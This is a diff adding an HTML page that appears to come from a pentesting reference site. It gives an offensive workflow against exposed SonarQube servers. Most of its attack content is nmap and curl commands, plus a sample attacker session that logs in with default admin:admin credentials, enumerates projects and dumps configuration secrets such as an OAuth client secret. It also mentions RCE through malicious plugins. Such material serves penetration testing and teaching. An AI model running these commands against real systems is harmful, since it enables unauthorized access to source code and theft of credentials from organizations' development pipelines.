@@ -1,0 +1,169 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">SonarQube Exploitation</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>DevOps & Code Analysis</strong> • Focus: <strong>SonarQube Abuse & Source Code Leaks</strong> • Last Updated: <strong>2025-09-05</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    SonarQube (TCP/9000) is a code quality and security review tool commonly used 
+    in CI/CD pipelines. Misconfigured or exposed SonarQube instances allow attackers 
+    to extract source code, secrets, and tokens from public projects. Vulnerable 
+    SonarQube versions have also been exploited for remote code execution (RCE) via 
+    API abuse or malicious plugin deployment. Compromising SonarQube often means 
+    compromising an organization's entire development workflow.
+  </p>
+</section>
+
+<!-- Why Exploitable -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
+  <ul class="list-disc ml-5 text-gray-200 space-y-2">
+    <li><strong>No Authentication:</strong> Public projects are often accessible without login.</li>
+    <li><strong>Weak Admin Credentials:</strong> Default <code>admin:admin</code> frequently left unchanged.</li>
+    <li><strong>Sensitive Data Exposure:</strong> Source code, API tokens, credentials in config files.</li>
+    <li><strong>API Exploitation:</strong> The REST API leaks project info and user tokens.</li>
+    <li><strong>Plugin Exploits:</strong> Malicious or vulnerable plugins can lead to RCE.</li>
+  </ul>
+</section>
+
+<!-- How Exploitation Works -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li><strong>Discovery:</strong> Identify SonarQube service (TCP/9000).</li>
+    <li><strong>Authentication:</strong> Attempt default or weak credentials.</li>
+    <li><strong>Enumeration:</strong> Query the API (<code>/api/projects</code>, <code>/api/settings</code>).</li>
+    <li><strong>Exfiltration:</strong> Extract source code, hardcoded secrets, API tokens.</li>
+    <li><strong>Exploitation:</strong> Abuse vulnerable APIs or upload malicious plugins for RCE.</li>
+  </ol>
+</section>
+
+<!-- Steps -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Steps</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li>Scan for SonarQube service on TCP/9000.</li>
+    <li>Check for web UI/API access (<code>http://target:9000</code>).</li>
+    <li>Test default credentials (<code>admin:admin</code>).</li>
+    <li>Enumerate projects and users via API endpoints.</li>
+    <li>Dump secrets or attempt plugin exploitation for RCE.</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# ------------------------------
+# Discovery
+# ------------------------------
+nmap -p9000 --script http-title,http-server-header [target]
+curl http://[target]:9000/api/system/status
+
+# ------------------------------
+# Authentication
+# ------------------------------
+curl -u admin:admin http://[target]:9000/api/authentication/validate
+
+# ------------------------------
+# Enumerate Projects
+# ------------------------------
+curl -u admin:admin http://[target]:9000/api/projects/search
+
+# ------------------------------
+# Extract Settings (tokens, secrets)
+# ------------------------------
+curl -u admin:admin http://[target]:9000/api/settings/values
+
+# ------------------------------
+# Exploit Token Access
+# ------------------------------
+curl -u <token>: http://[target]:9000/api/users/search
+
+# ------------------------------
+# Example Workflow
+# ------------------------------
+nmap -p9000 192.168.1.230
+curl -u admin:admin http://192.168.1.230:9000/api/projects/search
+curl -u admin:admin http://192.168.1.230:9000/api/settings/values
+  </pre>
+</section>
+
+<!-- Real-World Exploitation Walkthrough -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to expand attacker session
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+[ saide ~ ]$ nmap -p9000 192.168.1.230
+PORT     STATE SERVICE
+9000/tcp open  http
+|_http-title: SonarQube
+|_Server: SonarQube/8.9
+
+[ saide ~ ]$ curl -u admin:admin http://192.168.1.230:9000/api/authentication/validate
+{"valid":true,"login":"admin"}
+
+[ saide ~ ]$ curl -u admin:admin http://192.168.1.230:9000/api/projects/search
+{"paging":{"total":2},"components":[{"key":"finance-app"},{"key":"internal-api"}]}
+
+[ saide ~ ]$ curl -u admin:admin http://192.168.1.230:9000/api/settings/values
+{"settings":[{"key":"sonar.auth.github.clientSecret","value":"supersecret123"}]}
+
+[+] Extracted API secret from SonarQube config
+    </pre>
+  </details>
+</section>
+
+<!-- Example Results -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to view sample SonarQube exploitation results
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+# Service Discovery
+9000/tcp open  SonarQube 8.9
+
+# Weak Credentials
+admin : admin
+
+# Exploitation
+Enumerated projects and extracted secrets
+
+# Proof of Exploitation
+Found GitHub OAuth clientSecret: supersecret123
+    </pre>
+  </details>
+</section>
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-sonarqube" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        HackTricks – Pentesting SonarQube
+      </a>
+    </li>
+    <li>
+      <a href="https://www.cvedetails.com/product/41039/Sonarsource-Sonarqube.html" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        CVE Details – SonarQube Vulnerabilities
+      </a>
+    </li>
+    <li>Red Team workflow: Discover → Weak creds → API enum → Extract secrets → Pivot into DevOps pipeline.</li>
+  </ul>
+</section>
